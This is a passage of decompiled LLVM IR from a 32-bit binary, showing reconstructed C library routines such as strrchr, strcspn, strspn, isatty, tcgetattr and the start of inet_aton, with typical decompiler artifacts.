  %v7_8054fb7 = phi i32 [ %v10_8054fb7, %dec_label_pc_8054fbc ], [ %v4_8054fad, %entry ]
  %v1_8054fb7 = inttoptr i32 %v7_8054fb7 to i8*
  %v2_8054fb7 = load i8, i8* %v1_8054fb7, align 1
  %v10_8054fb7 = add i32 %v7_8054fb7, %v9_8054fb7
  %v3_8054fb8 = udiv i32 %v4_8054fb7, 256
  %v4_8054fb8 = trunc i32 %v3_8054fb8 to i8
  %v16_8054fb8 = icmp eq i8 %v2_8054fb7, %v4_8054fb8
  br i1 %v16_8054fb8, label %dec_label_pc_8054fc5.loopexit, label %dec_label_pc_8054fbc

dec_label_pc_8054fbc:                             ; preds = %dec_label_pc_8054fb7
  %v3_8054fb7 = zext i8 %v2_8054fb7 to i32
  %v5_8054fb7 = and i32 %v4_8054fb7, -256
  %v6_8054fb7 = or i32 %v3_8054fb7, %v5_8054fb7
  %v4_8054fbc = icmp eq i8 %v2_8054fb7, 0
  %v1_8054fbe = icmp eq i1 %v4_8054fbc, false
  br i1 %v1_8054fbe, label %dec_label_pc_8054fb7, label %dec_label_pc_8054fc0

dec_label_pc_8054fc0:                             ; preds = %dec_label_pc_8054fbc
  br label %dec_label_pc_8054fc5

dec_label_pc_8054fc5.loopexit:                    ; preds = %dec_label_pc_8054fb7
  %phitmp = add i32 %v10_8054fb7, -1
  br label %dec_label_pc_8054fc5

dec_label_pc_8054fc5:                             ; preds = %dec_label_pc_8054fc5.loopexit, %dec_label_pc_8054fc0
  %v0_8054fc5 = phi i32 [ %phitmp, %dec_label_pc_8054fc5.loopexit ], [ 0, %dec_label_pc_8054fc0 ]
  ret i32 %v0_8054fc5

; uselistorder directives
  uselistorder i8 %v2_8054fb7, { 1, 2, 0 }
  uselistorder i32 %v4_8054fb7, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__GI_strchrnul() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_3()
  %v4_8054fcd = ptrtoint i8* %tmp5 to i32
  %v2_8054fd5 = mul i32 %tmp, 256
  %v3_8054fd5 = and i32 %v2_8054fd5, 65280
  %v4_8054fd5 = and i32 %tmp, -65281
  %v5_8054fd5 = or i32 %v3_8054fd5, %v4_8054fd5
  %v8_8054fd7.pre = load i1, i1* @df, align 1
  %v9_8054fd7 = select i1 %v8_8054fd7.pre, i32 -1, i32 1
  br label %dec_label_pc_8054fd7

dec_label_pc_8054fd7:                             ; preds = %dec_label_pc_8054fdc, %entry
  %v4_8054fd7 = phi i32 [ %v6_8054fd7, %dec_label_pc_8054fdc ], [ %v5_8054fd5, %entry ]
  %v7_8054fd7 = phi i32 [ %v10_8054fd7, %dec_label_pc_8054fdc ], [ %v4_8054fcd, %entry ]
  %v1_8054fd7 = inttoptr i32 %v7_8054fd7 to i8*
  %v2_8054fd7 = load i8, i8* %v1_8054fd7, align 1
  %v10_8054fd7 = add i32 %v7_8054fd7, %v9_8054fd7
  %v3_8054fd8 = udiv i32 %v4_8054fd7, 256
  %v4_8054fd8 = trunc i32 %v3_8054fd8 to i8
  %v16_8054fd8 = icmp eq i8 %v2_8054fd7, %v4_8054fd8
  br i1 %v16_8054fd8, label %dec_label_pc_8054fe0, label %dec_label_pc_8054fdc

dec_label_pc_8054fdc:                             ; preds = %dec_label_pc_8054fd7
  %v3_8054fd7 = zext i8 %v2_8054fd7 to i32
  %v5_8054fd7 = and i32 %v4_8054fd7, -256
  %v6_8054fd7 = or i32 %v3_8054fd7, %v5_8054fd7
  %v4_8054fdc = icmp eq i8 %v2_8054fd7, 0
  %v1_8054fde = icmp eq i1 %v4_8054fdc, false
  br i1 %v1_8054fde, label %dec_label_pc_8054fd7, label %dec_label_pc_8054fe0

dec_label_pc_8054fe0:                             ; preds = %dec_label_pc_8054fdc, %dec_label_pc_8054fd7
  %v1_8054fe0 = add i32 %v10_8054fd7, -1
  ret i32 %v1_8054fe0

; uselistorder directives
  uselistorder i8 %v2_8054fd7, { 1, 2, 0 }
  uselistorder i32 %v4_8054fd7, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8054fea = ptrtoint i8* %arg1 to i32
  %v4_8054ff2.pre = load i32, i32* @eax, align 4
  %v8_8054ff2.pre = load i1, i1* @df, align 1
  %v9_8054ff2 = select i1 %v8_8054ff2.pre, i32 -1, i32 1
  br label %dec_label_pc_8054ff2

dec_label_pc_8054ff2:                             ; preds = %dec_label_pc_8054ff6, %entry
  %v20_8054ff3 = phi i32 [ %v23_8054ff3, %dec_label_pc_8054ff6 ], [ %arg2, %entry ]
  %v4_8054ff2 = phi i32 [ %v6_8054ff2, %dec_label_pc_8054ff6 ], [ %v4_8054ff2.pre, %entry ]
  %v7_8054ff2 = phi i32 [ %v10_8054ff2, %dec_label_pc_8054ff6 ], [ %v4_8054fea, %entry ]
  %v1_8054ff2 = inttoptr i32 %v7_8054ff2 to i8*
  %v2_8054ff2 = load i8, i8* %v1_8054ff2, align 1
  %v3_8054ff3 = inttoptr i32 %v20_8054ff3 to i8*
  %v4_8054ff3 = load i8, i8* %v3_8054ff3, align 1
  %v15_8054ff3 = icmp eq i8 %v2_8054ff2, %v4_8054ff3
  %v1_8054ff4 = icmp eq i1 %v15_8054ff3, false
  br i1 %v1_8054ff4, label %dec_label_pc_8054ffe, label %dec_label_pc_8054ff6

dec_label_pc_8054ff6:                             ; preds = %dec_label_pc_8054ff2
  %v23_8054ff3 = add i32 %v20_8054ff3, %v9_8054ff2
  %v10_8054ff2 = add i32 %v7_8054ff2, %v9_8054ff2
  %v3_8054ff2 = zext i8 %v2_8054ff2 to i32
  %v5_8054ff2 = and i32 %v4_8054ff2, -256
  %v6_8054ff2 = or i32 %v3_8054ff2, %v5_8054ff2
  %v4_8054ff6 = icmp eq i8 %v2_8054ff2, 0
  %v1_8054ff8 = icmp eq i1 %v4_8054ff6, false
  br i1 %v1_8054ff8, label %dec_label_pc_8054ff2, label %dec_label_pc_8055002

dec_label_pc_8054ffe:                             ; preds = %dec_label_pc_8054ff2
  br label %dec_label_pc_8055002

dec_label_pc_8055002:                             ; preds = %dec_label_pc_8054ff6, %dec_label_pc_8054ffe
  %storemerge = phi i32 [ 1, %dec_label_pc_8054ffe ], [ 0, %dec_label_pc_8054ff6 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8054ff2, { 1, 2, 0 }
  uselistorder i32 %v9_8054ff2, { 1, 0 }
  uselistorder label %dec_label_pc_8055002, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strrchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805501c = ptrtoint i8* %arg1 to i32
  %v2_8055026 = mul i32 %arg2, 256
  %v3_8055026 = and i32 %v2_8055026, 65280
  %v4_8055026 = and i32 %arg2, -65281
  %v5_8055026 = or i32 %v3_8055026, %v4_8055026
  br label %dec_label_pc_8055028

dec_label_pc_8055028:                             ; preds = %dec_label_pc_8055030, %entry
  %v0_80550353 = phi i32 [ %v0_8055035, %dec_label_pc_8055030 ], [ 0, %entry ]
  %v4_8055028 = phi i32 [ %v6_8055028, %dec_label_pc_8055030 ], [ %v5_8055026, %entry ]
  %v0_8055030 = phi i32 [ %v1_8055030, %dec_label_pc_8055030 ], [ %v4_805501c, %entry ]
  %v1_8055028 = inttoptr i32 %v0_8055030 to i8*
  %v2_8055028 = load i8, i8* %v1_8055028, align 1
  %v3_8055028 = zext i8 %v2_8055028 to i32
  %v5_8055028 = and i32 %v4_8055028, -256
  %v6_8055028 = or i32 %v3_8055028, %v5_8055028
  %v1_805502a = udiv i32 %v4_8055028, 256
  %v2_805502a = trunc i32 %v1_805502a to i8
  %v16_805502a = icmp eq i8 %v2_805502a, %v2_8055028
  %v1_805502c = icmp eq i1 %v16_805502a, false
  br i1 %v1_805502c, label %dec_label_pc_8055030, label %dec_label_pc_805502e

dec_label_pc_805502e:                             ; preds = %dec_label_pc_8055028
  br label %dec_label_pc_8055030

dec_label_pc_8055030:                             ; preds = %dec_label_pc_8055028, %dec_label_pc_805502e
  %v0_8055035 = phi i32 [ %v0_80550353, %dec_label_pc_8055028 ], [ %v0_8055030, %dec_label_pc_805502e ]
  %v1_8055030 = add i32 %v0_8055030, 1
  %v4_8055031 = icmp eq i8 %v2_8055028, 0
  %v1_8055033 = icmp eq i1 %v4_8055031, false
  br i1 %v1_8055033, label %dec_label_pc_8055028, label %dec_label_pc_8055035

dec_label_pc_8055035:                             ; preds = %dec_label_pc_8055030
  ret i32 %v0_8055035

; uselistorder directives
  uselistorder i8 %v2_8055028, { 1, 0, 2 }
  uselistorder i32 %v0_8055030, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8055030, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-12 = alloca i32, align 4
  %v0_8055039 = load i32, i32* @esi, align 4
  %v0_805503a = load i32, i32* @ebx, align 4
  store i32 %v0_805503a, i32* %stack_var_-12, align 4
  store i32 0, i32* @esi, align 4
  %v4_805503d = ptrtoint i8* %tmp12 to i32
  store i32 %v4_805503d, i32* %ebx.global-to-local, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v2_80550594 = load i8, i8* %tmp12, align 1
  %v4_805505b6 = icmp eq i8 %v2_80550594, 0
  %v1_805505d8 = icmp eq i1 %v4_805505b6, false
  br i1 %v1_805505d8, label %dec_label_pc_8055047.lr.ph, label %dec_label_pc_805505f

dec_label_pc_8055047.lr.ph:                       ; preds = %entry
  %v3_80550595 = zext i8 %v2_80550594 to i32
  %v2_805504c20 = inttoptr i32 %tmp to i8*
  %v3_805504c21 = call i32 @__GI_strchr(i8* %v2_805504c20, i32 %v3_80550595)
  %v1_805505223 = icmp eq i32 %v3_805504c21, 0
  %v1_805505524 = icmp eq i1 %v1_805505223, false
  br i1 %v1_805505524, label %dec_label_pc_8055047.dec_label_pc_805505f_crit_edge, label %dec_label_pc_8055057

dec_label_pc_8055057:                             ; preds = %dec_label_pc_8055047.lr.ph, %dec_label_pc_8055057.dec_label_pc_8055047_crit_edge
  %v0_8055057 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055057 = add i32 %v0_8055057, 1
  store i32 %v1_8055057, i32* %ebx.global-to-local, align 4
  %v0_8055058 = load i32, i32* @esi, align 4
  %v1_8055058 = add i32 %v0_8055058, 1
  store i32 %v1_8055058, i32* @esi, align 4
  %v1_8055059 = inttoptr i32 %v1_8055057 to i8*
  %v2_8055059 = load i8, i8* %v1_8055059, align 1
  %v4_805505b = icmp eq i8 %v2_8055059, 0
  %v1_805505d = icmp eq i1 %v4_805505b, false
  br i1 %v1_805505d, label %dec_label_pc_8055057.dec_label_pc_8055047_crit_edge, label %dec_label_pc_805505f

dec_label_pc_8055057.dec_label_pc_8055047_crit_edge: ; preds = %dec_label_pc_8055057
  %v3_8055059 = zext i8 %v2_8055059 to i32
  %v0_805504b.pre = load i32, i32* %edi.global-to-local, align 4
  %v2_805504c = inttoptr i32 %v0_805504b.pre to i8*
  %v3_805504c = call i32 @__GI_strchr(i8* %v2_805504c, i32 %v3_8055059)
  %v1_8055052 = icmp eq i32 %v3_805504c, 0
  %v1_8055055 = icmp eq i1 %v1_8055052, false
  br i1 %v1_8055055, label %dec_label_pc_8055047.dec_label_pc_805505f_crit_edge, label %dec_label_pc_8055057

dec_label_pc_8055047.dec_label_pc_805505f_crit_edge: ; preds = %dec_label_pc_8055057.dec_label_pc_8055047_crit_edge, %dec_label_pc_8055047.lr.ph
  %v0_805505f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805505f

dec_label_pc_805505f:                             ; preds = %dec_label_pc_8055057, %dec_label_pc_8055047.dec_label_pc_805505f_crit_edge, %entry
  %v0_805505f = phi i32 [ %v0_805505f.pre, %dec_label_pc_8055047.dec_label_pc_805505f_crit_edge ], [ 0, %entry ], [ %v1_8055058, %dec_label_pc_8055057 ]
  %v2_8055061 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055061, i32* @ebx, align 4
  store i32 %v0_8055039, i32* @esi, align 4
  ret i32 %v0_805505f

; uselistorder directives
  uselistorder i8 %v2_8055059, { 1, 0 }
  uselistorder i8 %v2_80550594, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805505f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055057, { 1, 0 }
}

define i32 @__GI_strspn() local_unnamed_addr {
entry:
  %tmp = call i8* @__decompiler_undefined_function_3()
  %tmp31 = call i8* @__decompiler_undefined_function_3()
  %v0_8055069 = load i32, i32* @ebx, align 4
  %v2_805508115 = load i8, i8* %tmp31, align 1
  %v4_805508320 = icmp eq i8 %v2_805508115, 0
  br i1 %v4_805508320, label %dec_label_pc_805508d, label %dec_label_pc_8055087.lr.ph

dec_label_pc_8055087.lr.ph:                       ; preds = %entry
  %v3_805508116 = zext i8 %v2_805508115 to i32
  %v5_805508118 = and i32 %v0_8055069, -256
  %v6_805508119 = or i32 %v3_805508116, %v5_805508118
  %v4_805506a = ptrtoint i8* %tmp31 to i32
  %v4_8055087 = ptrtoint i8* %tmp to i32
  %v4_80550777.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8055087

dec_label_pc_8055072:                             ; preds = %dec_label_pc_8055072.preheader, %dec_label_pc_8055076
  %v0_8055076 = phi i32 [ %v1_8055076, %dec_label_pc_8055076 ], [ %v4_8055087, %dec_label_pc_8055072.preheader ]
  %v4_8055077 = phi i32 [ %v6_8055077, %dec_label_pc_8055076 ], [ %v6_80550779, %dec_label_pc_8055072.preheader ]
  %v3_8055072 = trunc i32 %v4_8055077 to i8
  %v15_8055072 = icmp eq i8 %v1_8055072, %v3_8055072
  br i1 %v15_8055072, label %dec_label_pc_805507f, label %dec_label_pc_8055076

dec_label_pc_8055076:                             ; preds = %dec_label_pc_8055072
  %v1_8055076 = add i32 %v0_8055076, 1
  %v1_8055077 = inttoptr i32 %v1_8055076 to i8*
  %v2_8055077 = load i8, i8* %v1_8055077, align 1
  %v3_8055077 = zext i8 %v2_8055077 to i32
  %v5_8055077 = and i32 %v4_8055077, -256
  %v6_8055077 = or i32 %v3_8055077, %v5_8055077
  %v4_8055079 = icmp eq i8 %v2_8055077, 0
  %v1_805507b = icmp eq i1 %v4_8055079, false
  br i1 %v1_805507b, label %dec_label_pc_8055072, label %dec_label_pc_805508d

dec_label_pc_805507f:                             ; preds = %dec_label_pc_8055072
  %v1_805507f = add i32 %v0_805507f, 1
  %v1_8055080 = add i32 %v0_8055080, 1
  %v1_8055081 = inttoptr i32 %v1_8055080 to i8*
  %v2_8055081 = load i8, i8* %v1_8055081, align 1
  %v3_8055081 = zext i8 %v2_8055081 to i32
  %v5_8055081 = and i32 %v4_8055081, -256
  %v6_8055081 = or i32 %v3_8055081, %v5_8055081
  %v4_8055083 = icmp eq i8 %v2_8055081, 0
  br i1 %v4_8055083, label %dec_label_pc_805508d, label %dec_label_pc_8055087

dec_label_pc_8055087:                             ; preds = %dec_label_pc_8055087.lr.ph, %dec_label_pc_805507f
  %v0_8055080 = phi i32 [ %v4_805506a, %dec_label_pc_8055087.lr.ph ], [ %v1_8055080, %dec_label_pc_805507f ]
  %v0_805507f = phi i32 [ 0, %dec_label_pc_8055087.lr.ph ], [ %v1_805507f, %dec_label_pc_805507f ]
  %v4_8055081 = phi i32 [ %v6_805508119, %dec_label_pc_8055087.lr.ph ], [ %v6_8055081, %dec_label_pc_805507f ]
  %v4_80550777 = phi i32 [ %v4_80550777.pre, %dec_label_pc_8055087.lr.ph ], [ %v4_8055077, %dec_label_pc_805507f ]
  %v2_80550775 = load i8, i8* %tmp, align 1
  %v4_805507910 = icmp eq i8 %v2_80550775, 0
  %v1_805507b12 = icmp eq i1 %v4_805507910, false
  br i1 %v1_805507b12, label %dec_label_pc_8055072.preheader, label %dec_label_pc_805508d

dec_label_pc_8055072.preheader:                   ; preds = %dec_label_pc_8055087
  %v3_80550776 = zext i8 %v2_80550775 to i32
  %v5_80550778 = and i32 %v4_80550777, -256
  %v6_80550779 = or i32 %v3_80550776, %v5_80550778
  %v1_8055072 = trunc i32 %v4_8055081 to i8
  br label %dec_label_pc_8055072

dec_label_pc_805508d:                             ; preds = %dec_label_pc_805507f, %dec_label_pc_8055087, %dec_label_pc_8055076, %entry
  %v0_805508d = phi i32 [ 0, %entry ], [ %v0_805507f, %dec_label_pc_8055076 ], [ %v1_805507f, %dec_label_pc_805507f ], [ %v0_805507f, %dec_label_pc_8055087 ]
  store i32 %v0_8055069, i32* @ebx, align 4
  ret i32 %v0_805508d

; uselistorder directives
  uselistorder i8 %v2_80550775, { 1, 0 }
  uselistorder i32 %v1_8055076, { 1, 0 }
  uselistorder i8 %v2_805508115, { 1, 0 }
  uselistorder i8* %tmp31, { 1, 0 }
  uselistorder label %dec_label_pc_805508d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8055087, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_805509e = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_80550a3 = icmp eq i32 %v3_805509e, 0
  %v1_80550a5 = zext i1 %v1_80550a3 to i32
  ret i32 %v1_80550a5
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80550b0 = load i32, i32* @edi, align 4
  %v0_80550b1 = load i32, i32* @esi, align 4
  store i32 %v0_80550b1, i32* %stack_var_-8, align 4
  %v15_80550b2 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v15_80550b2, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @edi, align 4
  %v3_80550c5 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v15_80550b2)
  %v4_80550c5 = trunc i32 %v3_80550c5 to i8
  store i32 %v3_80550c5, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v3_80550c5, 16777216
  %v1_80550cd = sdiv i32 %sext, 16777216
  store i32 %v1_80550cd, i32* %edx.global-to-local, align 4
  %v2_80550cf = icmp eq i8 %v4_80550c5, 0
  %v1_80550d1 = icmp eq i1 %v2_80550cf, false
  br i1 %v1_80550d1, label %dec_label_pc_8055108, label %dec_label_pc_80550d3

dec_label_pc_80550d3:                             ; preds = %entry
  %v2_80550d3 = load i32, i32* %stack_var_-44, align 4
  %v2_80550d6 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_80550d6, i32* %esi.global-to-local, align 4
  %v1_80550da = load i32, i32* @edi, align 4
  %v2_80550da = inttoptr i32 %v1_80550da to i32*
  store i32 %v2_80550d3, i32* %v2_80550da, align 4
  %v1_80550e0 = load i32, i32* @edi, align 4
  %v2_80550e0 = add i32 %v1_80550e0, 4
  %v3_80550e0 = inttoptr i32 %v2_80550e0 to i32*
  %v1_80550e7 = load i32, i32* @edi, align 4
  %v2_80550e7 = add i32 %v1_80550e7, 8
  %v3_80550e7 = inttoptr i32 %v2_80550e7 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_80550ee = load i32, i32* @edi, align 4
  %v2_80550ee = add i32 %v1_80550ee, 12
  %v3_80550ee = inttoptr i32 %v2_80550ee to i32*
  store i32 %tmp3, i32* %v3_80550ee, align 4
  %v4_80550f1 = zext i8 %tmp to i32
  %v5_80550f1 = load i32, i32* %eax.global-to-local, align 4
  %v6_80550f1 = and i32 %v5_80550f1, -256
  %v7_80550f1 = or i32 %v6_80550f1, %v4_80550f1
  store i32 %v7_80550f1, i32* %eax.global-to-local, align 4
  %v2_80550f5 = load i32, i32* @edi, align 4
  %v3_80550f5 = add i32 %v2_80550f5, 16
  %v4_80550f5 = inttoptr i32 %v3_80550f5 to i8*
  store i8 %tmp, i8* %v4_80550f5, align 1
  %v0_80550f8 = load i32, i32* @edi, align 4
  %v1_80550f8 = add i32 %v0_80550f8, 17
  store i32 %v1_80550f8, i32* %edi.global-to-local, align 4
  %v2_80550fb = load i32, i32* %stack_var_-27, align 4
  %v4_80550fb = inttoptr i32 %v1_80550f8 to i32*
  store i32 %v2_80550fb, i32* %v4_80550fb, align 4
  %v5_80550fb = load i32, i32* %edi.global-to-local, align 4
  %v6_80550fb = load i32, i32* %esi.global-to-local, align 4
  %v7_80550fb = load i1, i1* @df, align 1
  %v8_80550fb = select i1 %v7_80550fb, i32 -4, i32 4
  %v9_80550fb = add i32 %v8_80550fb, %v5_80550fb
  %v10_80550fb = add i32 %v8_80550fb, %v6_80550fb
  store i32 %v9_80550fb, i32* %edi.global-to-local, align 4
  store i32 %v10_80550fb, i32* %esi.global-to-local, align 4
  %v1_80550fc = inttoptr i32 %v10_80550fb to i32*
  %v2_80550fc = load i32, i32* %v1_80550fc, align 4
  %v4_80550fc = inttoptr i32 %v9_80550fb to i32*
  store i32 %v2_80550fc, i32* %v4_80550fc, align 4
  %v5_80550fc = load i32, i32* %edi.global-to-local, align 4
  %v6_80550fc = load i32, i32* %esi.global-to-local, align 4
  %v9_80550fc = add i32 %v5_80550fc, %v8_80550fb
  %v10_80550fc = add i32 %v6_80550fc, %v8_80550fb
  store i32 %v9_80550fc, i32* %edi.global-to-local, align 4
  store i32 %v10_80550fc, i32* %esi.global-to-local, align 4
  %v1_80550fd = inttoptr i32 %v10_80550fc to i32*
  %v2_80550fd = load i32, i32* %v1_80550fd, align 4
  %v4_80550fd = inttoptr i32 %v9_80550fc to i32*
  store i32 %v2_80550fd, i32* %v4_80550fd, align 4
  %v5_80550fd = load i32, i32* %edi.global-to-local, align 4
  %v6_80550fd = load i32, i32* %esi.global-to-local, align 4
  %v9_80550fd = add i32 %v5_80550fd, %v8_80550fb
  %v10_80550fd = add i32 %v6_80550fd, %v8_80550fb
  store i32 %v9_80550fd, i32* %edi.global-to-local, align 4
  store i32 %v10_80550fd, i32* %esi.global-to-local, align 4
  %v1_80550fe = inttoptr i32 %v10_80550fd to i32*
  %v2_80550fe = load i32, i32* %v1_80550fe, align 4
  %v4_80550fe = inttoptr i32 %v9_80550fd to i32*
  store i32 %v2_80550fe, i32* %v4_80550fe, align 4
  %v5_80550fe = load i32, i32* %edi.global-to-local, align 4
  %v6_80550fe = load i32, i32* %esi.global-to-local, align 4
  %v9_80550fe = add i32 %v5_80550fe, %v8_80550fb
  %v10_80550fe = add i32 %v6_80550fe, %v8_80550fb
  store i32 %v9_80550fe, i32* %edi.global-to-local, align 4
  store i32 %v10_80550fe, i32* %esi.global-to-local, align 4
  %v1_80550ff = inttoptr i32 %v10_80550fe to i16*
  %v2_80550ff = load i16, i16* %v1_80550ff, align 2
  %v4_80550ff = inttoptr i32 %v9_80550fe to i16*
  store i16 %v2_80550ff, i16* %v4_80550ff, align 2
  %v5_80550ff = load i32, i32* %edi.global-to-local, align 4
  %v6_80550ff = load i32, i32* %esi.global-to-local, align 4
  %v8_80550ff = select i1 %v7_80550fb, i32 -2, i32 2
  %v9_80550ff = add i32 %v5_80550ff, %v8_80550ff
  %v10_80550ff = add i32 %v6_80550ff, %v8_80550ff
  store i32 %v9_80550ff, i32* %edi.global-to-local, align 4
  store i32 %v10_80550ff, i32* %esi.global-to-local, align 4
  %v1_8055101 = inttoptr i32 %v10_80550ff to i8*
  %v2_8055101 = load i8, i8* %v1_8055101, align 1
  %v4_8055101 = inttoptr i32 %v9_80550ff to i8*
  store i8 %v2_8055101, i8* %v4_8055101, align 1
  %v5_8055101 = load i32, i32* %edi.global-to-local, align 4
  %v6_8055101 = load i32, i32* %esi.global-to-local, align 4
  %v7_8055101 = load i1, i1* @df, align 1
  %v8_8055101 = select i1 %v7_8055101, i32 -1, i32 1
  %v9_8055101 = add i32 %v8_8055101, %v5_8055101
  %v10_8055101 = add i32 %v8_8055101, %v6_8055101
  store i32 %v9_8055101, i32* %edi.global-to-local, align 4
  store i32 %v10_8055101, i32* %esi.global-to-local, align 4
  %v0_8055102 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8055102, i32* %eax.global-to-local, align 4
  %v2_8055104 = inttoptr i32 %v9_8055101 to i32*
  store i32 %v0_8055102, i32* %v2_8055104, align 4
  %v3_8055104 = load i32, i32* %edi.global-to-local, align 4
  %v5_8055104 = select i1 %v7_8055101, i32 -4, i32 4
  %v6_8055104 = add i32 %v3_8055104, %v5_8055104
  store i32 %v6_8055104, i32* %edi.global-to-local, align 4
  %v0_8055105 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055105 = inttoptr i32 %v6_8055104 to i32*
  store i32 %v0_8055105, i32* %v2_8055105, align 4
  %v3_8055105 = load i32, i32* %edi.global-to-local, align 4
  %v6_8055105 = add i32 %v3_8055105, %v5_8055104
  store i32 %v6_8055105, i32* %edi.global-to-local, align 4
  %v0_8055106 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055106 = inttoptr i32 %v6_8055105 to i32*
  store i32 %v0_8055106, i32* %v2_8055106, align 4
  %v3_8055106 = load i32, i32* %edi.global-to-local, align 4
  %v6_8055106 = add i32 %v3_8055106, %v5_8055104
  store i32 %v6_8055106, i32* %edi.global-to-local, align 4
  %v0_8055107 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055107 = trunc i32 %v0_8055107 to i8
  %v3_8055107 = inttoptr i32 %v6_8055106 to i8*
  store i8 %v1_8055107, i8* %v3_8055107, align 1
  %v4_8055107 = load i32, i32* %edi.global-to-local, align 4
  %v5_8055107 = load i1, i1* @df, align 1
  %v6_8055107 = select i1 %v5_8055107, i32 -1, i32 1
  %v7_8055107 = add i32 %v6_8055107, %v4_8055107
  store i32 %v7_8055107, i32* %edi.global-to-local, align 4
  %v0_805510b.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_805510d.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8055108

dec_label_pc_8055108:                             ; preds = %entry, %dec_label_pc_80550d3
  %v2_805510d = phi i32 [ %v0_80550b1, %entry ], [ %v2_805510d.pre, %dec_label_pc_80550d3 ]
  %v0_805510b = phi i32 [ %v1_80550cd, %entry ], [ %v0_805510b.pre, %dec_label_pc_80550d3 ]
  store i32 %v0_805510b, i32* %eax.global-to-local, align 4
  store i32 %v2_805510d, i32* @esi, align 4
  store i32 %v0_80550b0, i32* @edi, align 4
  ret i32 %v0_805510b

; uselistorder directives
  uselistorder i32 %v0_805510b, { 1, 0 }
  uselistorder i32 %v1_80550cd, { 1, 0 }
  uselistorder i32 %v3_80550c5, { 0, 2, 1 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 -2, { 20, 0, 22, 21, 23, 1, 3, 2, 24, 13, 14, 15, 16, 17, 18, 19, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* @df, { 8, 9, 10, 0, 1, 2, 12, 14, 13, 5, 3, 11, 6, 4, 7 }
  uselistorder i32 17, { 14, 8, 12, 0, 3, 9, 13, 10, 11, 4, 5, 6, 7, 1, 2 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7, 9, 8, 11, 10, 13, 12, 15, 14, 17, 16, 19, 18, 21, 20, 23, 22, 24, 25, 26, 27, 28 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8055108, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805511b = icmp eq i8* %arg1, null
  br i1 %v1_805511b, label %dec_label_pc_805519c, label %dec_label_pc_805511f

dec_label_pc_805511f:                             ; preds = %entry
  %v4_8055117 = ptrtoint i8* %arg1 to i32
  %v0_805512d.pre = load i32, i32* @global_var_8057c00, align 1024
  br label %dec_label_pc_805512a

dec_label_pc_805512a:                             ; preds = %dec_label_pc_805511f, %dec_label_pc_8055173
  %v0_8055173 = phi i32 [ 0, %dec_label_pc_805511f ], [ %v2_8055179, %dec_label_pc_8055173 ]
  %v2_8055176 = phi i32 [ 1, %dec_label_pc_805511f ], [ %v3_8055176, %dec_label_pc_8055173 ]
  %v0_805512a = phi i32 [ %v4_8055117, %dec_label_pc_805511f ], [ %v0_805512a4, %dec_label_pc_8055173 ]
  %v1_805512a = inttoptr i32 %v0_805512a to i8*
  %v2_805512a = load i8, i8* %v1_805512a, align 1
  %v3_805512a = zext i8 %v2_805512a to i32
  %v2_8055133 = mul nuw nsw i32 %v3_805512a, 2
  %v3_8055133 = add i32 %v2_8055133, %v0_805512d.pre
  %v4_8055133 = inttoptr i32 %v3_8055133 to i8*
  %v5_8055133 = load i8, i8* %v4_8055133, align 1
  %v6_8055133 = and i8 %v5_8055133, 8
  %v7_8055133 = icmp eq i8 %v6_8055133, 0
  br i1 %v7_8055133, label %dec_label_pc_805519c, label %dec_label_pc_805513a

